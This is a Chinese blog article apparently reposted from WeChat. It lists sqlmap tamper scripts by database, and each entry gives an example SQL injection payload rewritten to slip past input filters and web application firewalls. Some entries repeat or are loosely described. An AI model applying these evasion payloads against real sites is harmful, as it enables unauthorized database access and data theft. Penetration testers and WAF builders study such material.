\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/KvjeGVoPen7pO02tv3gxpw)

孤独是什么，洗了个头，吹了个好看的发型，换了双干净的鞋子，穿了件帅气的衣服，去超市买了一包烟和一瓶水然后就回家了。。。

\----  网易云热评

一、支持所有的数据库

1、apostrophemask.py

作用：用 utf8 代替引号

```
("1 AND '1'='1")替换后'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'
```

2、base64encode.py

作用：用 base64 编码替换

```
("1' AND SLEEP(5)#")替换后'MScgQU5EIFNMRUVQKDUpIw=='
```

3、multiplespaces.py

作用：围绕 SQL 关键字添加多个空格

```
('1 UNION SELECT foobar')替换后'1    UNION     SELECT   foobar'
```

4、space2plus.py

作用：用 + 替换空格

```
('SELECT id FROM users')替换后'SELECT+id+FROM+users'
```

5、nonrecursivereplacement.py

作用：双重查询语句

```
('1 UNION SELECT 2--')替换后'1 UNIOUNIONN SELESELECTCT 2--'
```

6、space2randomblank.py

作用：代替空格字符（“”）从一个随机的空白字符可选字符的有效集

```
('SELECT id FROM users')替换后'SELECT%0Did%0DFROM%0Ausers'
```

7、unionalltounion.py

作用：替换 UNION ALL SELECT UNION SELECT

```
('-1 UNION ALL SELECT')替换后'-1 UNION SELECT'
```

8、securesphere.py

作用：追加特制的字符串

```
('1 AND 1=1')替换后"1 AND 1=1 and '0having'='0having'"
```

二、MSSQL 数据库

1、space2hash.py

作用：绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）

```
'1 AND 9227=9227'替换后'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'
```

2、equaltolike.py

作用：like 代替等号

```
SELECT \* FROM users WHERE id=1替换后SELECT \* FROM users WHERE id LIKE 1
```

3、space2mssqlblank.py(mssql)

作用：空格替换为其它空符号

```
SELECT id FROM users替换后SELECT%08id%02FROM%0Fusers
```

4、space2mssqlhash.py

作用：替换空格

```
('1 AND 9227=9227')替换后'1%23%0AAND%23%0A9227=9227'
```

5、between.py

作用：用 between 替换大于号（>）

```
('1 AND A > B--')替换后'1 AND A NOT BETWEEN 0 AND B--'
```

6、percentage.py

作用：asp 允许每个字符前面添加一个 % 号

```
SELECT FIELD FROM TABLE替换后%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E
```

7、sp\_password.py

作用：追加 sp\_password’从 DBMS 日志的自动模糊处理的有效载荷的末尾

```
('1 AND 9227=9227-- ')替换后'1 AND 9227=9227-- sp\_password'
```

8、charencode.py

作用：url 编码

```
SELECT FIELD FROM%20TABLE替换后 %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45
```

9、randomcase.py

作用：随机大小写

```
INSERT替换后InsERt
```

10、charunicodeencode.py

作用：字符串 unicode 编码

```
SELECT FIELD%20FROM TABLE替换后%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′
```

11、space2comment.py

作用：将空格替换成 /\*\*/

```
SELECT id FROM users替换后SELECT/\*\*/id/\*\*/FROM/\*\*/users
```

三、MYSQL 数据库

1、equaltolike.py

作用：like 代替等号

```
SELECT \* FROM users WHERE id=1替换后SELECT \* FROM users WHERE id LIKE 1
```

2、greatest.py

作用：绕过过滤’>’ , 用 GREATEST 替换大于号。

```
('1 AND A > B')替换后'1 AND GREATEST(A,B+1)=A'
```

3、apostrophenullencode.py

作用：绕过过滤双引号，替换字符和双引号。

```
("1 AND '1'='1")替换后'1 AND %00%271%00%27=%00%271'
```

4、ifnull2ifisnull.py

作用：绕过对 IFNULL 过滤。

```
('IFNULL(1, 2)')替换后'IF(ISNULL(1),2,1)'
```

5、space2mssqlhash.py

作用：替换空格

```
('1 AND 9227=9227')替换后'1%23%0AAND%23%0A9227=9227'
```

6、modsecurityversioned.py

作用：过滤空格，包含完整的查询版本注释

```
('1 AND 2>1--')替换后'1 /\*!30874AND 2>1\*/--'
```

7、space2mysqlblank.py

作用：空格替换其它空白符号 (mysql)

```
SELECT id FROM users替换后SELECT%0Bid%0BFROM%A0users
```

8、between.py

作用：用 between 替换大于号（>）

```
('1 AND A > B--')替换后'1 AND A NOT BETWEEN 0 AND B--'
```

9、modsecurityzeroversioned.py

作用：包含了完整的查询与零版本注释

```
('1 AND 2>1--')替换后'1 /\*!00000AND 2>1\*/--'
```

10、space2mysqldash.py

作用：替换空格字符（''）（' – '）后跟一个破折号注释一个新行（' n'）

```
('1 AND 9227=9227')替换后'1--%0AAND--%0A9227=9227'
```

11、bluecoat.py

作用：代替空格字符后与一个有效的随机空白字符的 SQL 语句。然后替换 = 为 like

```
('SELECT id FROM users where id = 1')替换后'SELECT%09id FROM users where id LIKE 1'
```

12、percentage.py

作用：asp 允许每个字符前面添加一个 % 号

```
SELECT FIELD FROM TABLE替换后%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E
```

13、charencode.py

作用：url 编码

```
SELECT FIELD FROM%20TABLE替换后 %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45
```

14、randomcase.py

作用：随机大小写

```
INSERT替换后 InsERt
```

15、versionedkeywords.py

作用：注释绕过 

```
('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT\_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#') 替换后 1/\*!UNION\*//\*!ALL\*//\*!SELECT\*//\*!NULL\*/,/\*!NULL\*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT\_USER()/\*!AS\*//\*!CHAR\*/),CHAR(32)),CHAR(58,100,114,117,58))#
```

16、space2comment.py

作用：将空格替换为 /\*\*/ 

```
SELECT id FROM users替换后 SELECT/\*\*/id/\*\*/FROM/\*\*/users
```

17、charunicodeencode.py

作用：字符串 unicode 编码

```
SELECT FIELD%20FROM TABLE替换后%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′
```

18、versionedmorekeywords.py

作用：注释绕过

```
1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT\_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#
替换后1/\*!UNION\*\*!ALL\*\*!SELECT\*\*!NULL\*/,/\*!NULL\*/,/\*!CONCAT\*/(/\*!CHAR\*/(58,122,114,115,58),/\*!IFNULL\*/(CAST(/\*!CURRENT\_USER\*/()/\*!AS\*\*!CHAR\*/),/\*!CHAR\*/(32)),/\*!CHAR\*/(58,115,114,121,58))#
```

mysql 小于 5.1

19、halfversionedmorekeywords.py

作用：关键字前加注释

```
value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT\_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa
替换后value’/\*!0UNION/\*!0ALL/\*!0SELECT/\*!0CONCAT(/\*!0CHAR(58,107,112,113,58),/\*!0IFNULL(CAST(/\*!0CURRENT\_USER()/\*!0AS/\*!0CHAR),/\*!0CHAR(32)),/\*!0CHAR(58,97,110,121,58)), NULL, NULL#/\*!0AND ‘QDWa’='QDWa
```

20、halfversionedmorekeywords.py

作用：当数据库为 mysql 时绕过防火墙，每个关键字之前添加

```
("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT\_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")替换后"value'/\*!0UNION/\*!0ALL/\*!0SELECT/\*!0CONCAT(/\*!0CHAR(58,107,112,113,58),/\*!0IFNULL(CAST(/\*!0CURRENT\_USER()/\*!0AS/\*!0CHAR),/\*!0CHAR(32)),/\*!0CHAR(58,97,110,121,58)),/\*!0NULL,/\*!0NULL#/\*!0AND 'QDWa'='QDWa"
```

四、Oracle 数据库

1、greatest.py

作用：绕过过滤’>’ , 用 GREATEST 替换大于号。

```
('1 AND A > B')替换后'1 AND GREATEST(A,B+1)=A'
```

2、apostrophenullencode.py

作用：绕过过滤双引号，替换字符和双引号。

```
("1 AND '1'='1")替换后'1 AND %00%271%00%27=%00%271'
```

3、between.py

作用：用 between 替换大于号（>）

```
('1 AND A > B--')替换后'1 AND A NOT BETWEEN 0 AND B--'
```

4、charencode.py

作用：url 编码

```
SELECT FIELD FROM%20TABLE替换后%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45
```

5、randomcase.py

作用：随机大小写

```
INSERT替换后 InsERt
```

6、charunicodeencode.py

作用：字符串 unicode 编码

```
SELECT FIELD%20FROM TABLE替换后%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′
```

7、space2comment.py

作用：将空格替换成 /\*\*/

```
SELECT id FROM users替换后SELECT/\*\*/id/\*\*/FROM/\*\*/users
```

五、PostgreSQL 数据库

1、greatest.py

作用：绕过过滤’>’ , 用 GREATEST 替换大于号。

```
('1 AND A > B')替换后'1 AND GREATEST(A,B+1)=A'
```

2、apostrophenullencode.py

作用：绕过过滤双引号，替换字符和双引号。

```
("1 AND '1'='1")替换后'1 AND %00%271%00%27=%00%271'
```

3、between.py

作用：用 between 替换大于号（>）

```
('1 AND A > B--')替换后'1 AND A NOT BETWEEN 0 AND B--'
```

4、percentage.py

asp 允许每个字符前面添加一个 % 号

```
SELECT FIELD FROM TABLE替换后%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E
```

5、charencode.py

作用：url 编码

```
SELECT FIELD FROM%20TABLE替换后%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45
```

6、randomcase.py

作用：随机大小写

```
INSERT替换后 InsERt
```

7、charunicodeencode.py

作用：字符串 unicode 编码

```
SELECT FIELD%20FROM TABLE替换后%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′
```

8、space2comment.py

作用：将空格替换成 /\*\*/

```
SELECT id FROM users替换后SELECT/\*\*/id/\*\*/FROM/\*\*/users
```

六、Microsoft Access 数据库

1、appendnullbyte.py

作用：在有效负荷结束位置加载零字节字符编码

```
('1 AND 1=1')替换后'1 AND 1=1%00'
```

七、其他数据库

1、chardoubleencode.py

作用：双 url 编码 (不处理已编码的)

```
SELECT FIELD FROM%20TABLE替换后%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545
```

2、unmagicquotes.py

作用：宽字符绕过 GPC  addslashes

```
1′ AND 1=1替换后1%bf%27 AND 1=1--
```

3、randomcomments.py

作用：用 /\*\*/ 分割 sql 关键字

```
'INSERT'替换后'IN/\*\*/S/\*\*/ERT’
```

禁止非法，后果自负

欢迎关注公众号：web 安全工具库

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibusRbVECWwgXXRCVZZXmEeC1jgMhKrue6jwdczbkr0qgFlUtkWHFjFIFC7zNcMCxXKdQLV0eYXrRQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibusRbVECWwgXXRCVZZXmEeCticeicGR16nB7ppw2uiaA9BT47Dr5LtzIMA0U1dtgkoCtEfVtQUF8l3LA/640?wx_fmt=jpeg)